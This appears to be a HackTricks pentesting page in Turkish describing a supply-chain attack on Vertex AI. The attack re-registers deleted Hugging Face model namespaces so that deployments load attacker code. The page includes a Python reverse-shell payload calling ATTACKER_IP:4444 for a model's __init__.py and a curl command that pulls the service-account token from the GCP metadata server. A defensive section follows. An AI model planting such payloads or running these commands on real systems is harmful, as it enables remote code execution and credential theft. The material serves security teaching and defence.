# GCP - Vertex AI Post-Exploitation via Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## Senaryo

- Vertex AI Model Garden birçok Hugging Face (HF) modelinin doğrudan dağıtımına izin verir.
- HF model tanımlayıcıları Author/ModelName'dir. Eğer HF'de bir author/org silinirse, aynı yazar adı herhangi birisi tarafından yeniden kayıt edilebilir. Saldırganlar daha sonra eski yol üzerinde aynı ModelName ile bir repo oluşturabilir.
- Pipelines, SDKs veya yalnızca ada göre (pinning/integrity yok) çekim yapan cloud katalogları saldırgan kontrollü repoyu çeker. Model dağıtıldığında, o repodaki loader code Vertex AI endpoint container içinde çalıştırılabilir ve endpoint’in izinleriyle RCE sağlar.

HF üzerinde iki yaygın takeover durumu:
- Ownership deletion: Eski yol 404 döner; birisi yazarı yeniden kaydedip aynı ModelName'i yayınlayana kadar.
- Ownership transfer: HF, eski Author/ModelName'den yeni yazara 307 redirect gönderir. Eğer eski yazar daha sonra silinir ve bir saldırgan tarafından yeniden kaydedilirse, redirect zinciri kırılır ve saldırganın reposu legacy path üzerinde hizmet verir.

## Yeniden Kullanılabilir Namespace'leri Belirleme (HF)

- Eski yazar silinmiş: yazar sayfası 404 döner; model yolu takeover olana kadar 404 dönebilir.
- Transfer edilmiş modeller: eski model yolu, eski yazar varken yeni sahibine 307 gönderir. Eğer eski yazar daha sonra silinir ve yeniden kayıt olursa, legacy yol saldırganın reposuna çözümlenir.

Hızlı kontroller curl ile:
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>
# 200 = exists, 404 = deleted/available

# Check old model path behavior
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 = redirect to new owner (transfer case)
# 404 = missing (deletion case) until someone re-registers
```
## Vertex AI'ye Karşı Uçtan Uca Saldırı Akışı

1) Model Garden'ın deployable olarak listelediği yeniden kullanılabilir model namespace'lerini keşfedin:
- Vertex AI Model Garden'da hala “verified deployable” olarak görünen HF modellerini bulun.
- HF'de orijinal author'ın silinip silinmediğini veya modelin transfer edilip eski author'ın daha sonra kaldırılıp kaldırılmadığını doğrulayın.

2) Silinmiş author'ı HF'de yeniden kaydedin ve aynı ModelName'i yeniden oluşturun.

3) Kötü amaçlı bir repo yayınlayın. Model load sırasında çalışan kodu ekleyin. HF model load sırasında yaygın olarak çalışan örnekler:
- Repodaki __init__.py içindeki yan etkiler
- config/auto_map tarafından referans verilen özel modeling_*.py veya processing code
- Transformers pipelines içinde trust_remote_code=True gerektiren kod yolları

4) Eski Author/ModelName'e ait bir Vertex AI deployment'ı artık saldırganın reposunu çeker. Yükleyici Vertex AI endpoint konteyneri içinde çalıştırılır.

5) Payload, endpoint ortamından (RCE) endpoint'in izinleriyle erişim sağlar.

import sırasında çalıştırılan örnek payload parçası (sadece gösterim amaçlı):
```python
# Place in __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # Or python -c exec ...

if os.environ.get("VTX_AI","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
Notlar
- Gerçek dünyadaki loader'lar farklılık gösterir. Birçok Vertex AI HF entegrasyonu, modelin config'inde referans verilen repo modüllerini (ör. auto_map) clone edip import eder; bu kod çalıştırmayı tetikleyebilir. Bazı durumlar trust_remote_code=True gerektirir.
- Endpoint tipik olarak sınırlı kapsamlı özel bir container içinde çalışır, ancak veri erişimi ve GCP'de lateral movement için geçerli bir ilk üs olabilir.

## Post-Exploitation İpuçları (Vertex AI Endpoint)

Kod endpoint container içinde çalışmaya başladıktan sonra şunları göz önünde bulundurun:
- Kimlik bilgileri/tokenlar için environment variables ve metadata'yı listeleme
- Bağlı storage veya mount edilmiş model artifact'larına erişim
- service account identity aracılığıyla Google API'leri ile etkileşim (Document AI, Storage, Pub/Sub, vb.)
- Platform repo'yu yeniden pull'larsa model artifact içinde persistence

Erişilebilirse instance metadata'yı enumerate edin (container'a bağlı):
```bash
curl -H "Metadata-Flavor: Google" \
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
## Vertex AI Kullanıcıları için Savunma Rehberi

- Sessiz değiştirmeyi önlemek için HF loaders içinde modelleri commit'e göre sabitleyin:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- Onaylanmış HF modellerini güvenilir bir iç artifact store/registry'ye aynalayın ve oradan dağıtın.
- Kod tabanlarını ve konfigürasyonları, silinmiş/transfer edilmiş hard-coded Author/ModelName için sürekli tarayın; yeni namespace'lere güncelleyin veya commit ile sabitleyin.
- Model Garden'da, dağıtımdan önce modelin kökenini (provenance) ve author varlığını doğrulayın.

## Tanıma Heuristikleri (HTTP)

- Deleted author: author sayfası 404; legacy model path 404 takeover gerçekleşene kadar.
- Transferred model: legacy path, eski author varken yeni author'a 307 döner; eğer eski author daha sonra silinir ve yeniden kaydolursa, legacy path attacker içeriği servis eder.
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## Çapraz Referanslar

- Daha geniş metodoloji ve tedarik zinciri notlarına bakın:

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## Kaynaklar

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
